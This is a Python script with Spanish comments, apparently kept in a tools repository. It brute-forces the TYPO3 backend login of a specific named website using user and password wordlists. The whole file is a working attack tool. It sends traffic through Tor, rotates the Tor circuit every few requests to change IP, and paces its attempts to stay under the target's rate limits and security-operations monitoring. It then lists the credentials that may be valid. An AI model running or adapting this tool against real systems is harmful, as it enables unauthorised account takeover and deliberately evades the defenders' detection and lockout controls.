#!/usr/bin/env python3
import requests, time, random, sys, os
from pathlib import Path
from urllib.parse import urlencode

# La herramienta vive en herramientas/typo3-brute-tor/. Las listas siguen
# en la raíz del repo (users.txt / passwords.txt), que están en .gitignore.
REPO_ROOT = Path(__file__).resolve().parents[2]

# CONFIGURACIÓN RÁPIDA (EDITAR AQUÍ)
TARGET = "https://gc-heat.de"          # Cambiar si es otro objetivo.
LOGIN_URL = TARGET + "/typo3/login?loginProvider=1433416747"  # Endpoint exacto.

USERS_FILE   = str(REPO_ROOT / "users.txt")       # Lista de usuarios (uno por línea).
PASSWORDS_FILE = str(REPO_ROOT / "passwords.txt")  # Diccionario de contraseñas (uno por línea).

# Throttle y rotación: ajustar según tolerancia del SOC.
MIN_DELAY  = 1.5    # Minimo entre peticiones en segundos (evitar bloqueos).
MAX_DELAY  = 4.0    # Maximo entre peticiones en segundos.
NEW_CIRCUIT_EVERY_N_REQUESTS = 3      # Cada N intentos, rotar circuito Tor (cambia IP).

# Palabra clave de error conocida: si aparece → credencial incorrecta.
FAIL_MARKER = "Your login attempt did not succeed"

HEADERS_BASE = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept-Language": "en-US,en;q=0.5"
}

# Función para rotar circuito Tor (SOCKS control via 9051).
def new_tor_circuit():
    # Se asume que torrc tiene: ControlPort 9051 y AuthCookie configurado,
    # o bien usamos una conexión sin auth si está permitida en local.
    try:
        import socket

        s = socket.create_connection(("127.0.0.1", 9051), timeout=3)
        if not hasattr(s, "sendall"):
            return False

        # Intento sin auth (si está configurado así en tu entorno).
        try:
            s.send(b"AUTHENTICATE \"\"\r\n")
            resp = b""
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                resp += chunk

            # Si no funciona sin auth, se puede añadir AUTHENTICATE "AUTH ..." si lo tienes.
        except Exception:
            return False

        try:
            s.send(b"signal NEWNYM\r\n")
            time.sleep(1)  # Dar tiempo a que el nuevo circuito esté listo.
        finally:
            s.close()

    except Exception:
        pass  # Si falla, seguimos igual; solo es rotación opcional.

# Cargar listas de usuarios y passwords (ignorar líneas vacías).
def load_lines(path):
    if not os.path.exists(path):
        print(f"[!] Archivo no encontrado: {path}", file=sys.stderr)
        sys.exit(1)
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

users = load_lines(USERS_FILE)
passwords = load_lines(PASSWORDS_FILE)

if not users or not passwords:
    print("[!] Las listas de usuarios o contraseñas están vacías.", file=sys.stderr)
    sys.exit(1)

# Configurar sesión con proxy SOCKS5 (Tor).
session = requests.Session()
proxies = {
    "http":  "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

# Verificar conexión inicial con Tor (opcional, informativo).
try:
    r = session.get("https://ifconfig.me/", proxies=proxies, timeout=8)
    print(f"[+] IP pública actual vía Tor: {r.text.strip()}")
except Exception as e:
    print(f"[-] Error al verificar IP por Tor (continuará igual): {e}", file=sys.stderr)

request_count = 0
candidates = []   # Posibles credenciales válidas.

print("[*] Iniciando fuerza bruta contra:", LOGIN_URL, flush=True)

for user in users:
    for pwd in passwords:
        request_count += 1

        # Rotar circuito Tor cada N intentos para cambiar IP y evitar bloqueos rápidos.
        if (request_count % NEW_CIRCUIT_EVERY_N_REQUESTS == 0):
            new_tor_circuit()

        time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))

        data = urlencode({
            "login_status": "login",
            "userident": pwd,          # Aquí se envía la contraseña en tu ejemplo.
            "redirect_url": "",
            "loginRefresh": "",
            "username": user,          # Usuario probado.
            "p_field": "",             # En tu muestra estaba vacío; si cambia, ajustar aquí.
            "interface": "backend",
            "commandLI": ""
        })

        # Reintentos limitados para evitar que un circuito lento mate el ataque.
        r = None
        for attempt in range(1, 4):  # hasta 3 intentos por credencial.
            try:
                r = session.post(
                    LOGIN_URL,
                    data=data,
                    headers=HEADERS_BASE,
                    proxies=proxies,
                    timeout=20,       # más tiempo para Tor lento.
                    allow_redirects=False  # Para ver mejor códigos y redirecciones.
                )

                text = (r.text or "").lower()

            except requests.RequestException as e:
                print(f"[-] Error en petición #{request_count} ({user}:{pwd}) intento {attempt}: {e}", file=sys.stderr)
                if attempt < 3:
                    time.sleep(2 * attempt)  # espera progresiva.
                    continue

            break  # si llegamos aquí sin excepción, salimos del bucle de intentos.

        if r is None:
            print(f"[-] Abandonando #{request_count} ({user}:{pwd}) tras reintentos.", file=sys.stderr)
            continue

        if FAIL_MARKER.lower() in text:
            # Credencial incorrecta confirmada por mensaje de error.
            continue

        if r.status_code == 403 and ("ratelimit" in text or "locked" in text):
            # Posible bloqueo por intentos; rotar circuito y esperar un poco más.
            new_tor_circuit()
            time.sleep(5)
            print(f"[!] Rate limit detectado en #{request_count}. Rotando Tor + pausa.", flush=True)

        # Si no aparece el marcador de error, consideramos candidata para revisión manual.
        candidates.append((user, pwd, r.status_code))
        print(f"[?] CANDIDATO #{request_count}: {user}:{pwd} -> HTTP {r.status_code}", flush=True)

print("\n[*] Finalizado.")
if not candidates:
    print("[*] No se detectaron credenciales candidatas con los parámetros actuales.")
else:
    print(f"[*] Candidatos encontrados ({len(candidates)}). Revisar manualmente en el navegador o logs:")
    for u, p, code in candidates:
        print(f"   - {u}:{p} (HTTP {code})")
